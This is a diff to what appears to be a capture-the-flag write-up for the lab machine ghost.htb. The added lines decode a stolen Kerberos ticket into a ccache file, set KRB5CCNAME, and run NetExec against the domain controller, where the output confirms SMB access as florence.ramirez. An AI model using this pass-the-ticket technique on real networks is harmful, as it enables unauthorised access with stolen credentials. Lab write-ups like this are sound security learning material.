@@ -724,6 +724,22 @@ Ill encode the output of the ticket in base64 then output it to the screen, ill 
 cat florenceramirez.b64 | base64 -d | tee florenceramirez.ccache
 ```
 
-So once the file is on one line ill decode the 
+So once the file is on one line ill decode the base64 and direct the output to the ccache file
+
+```python
+export KRB5CCNAME=florenceramirez.ccache
+```
+
+Now i can test access
+
+```python
+nxc smb dc01.ghost.htb --use-kcache                      
+SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.ghost.htb  445    DC01             [+] GHOST.HTB\florence.ramirez from ccache
+```
+
+IT WORKS!
+
+
 
 
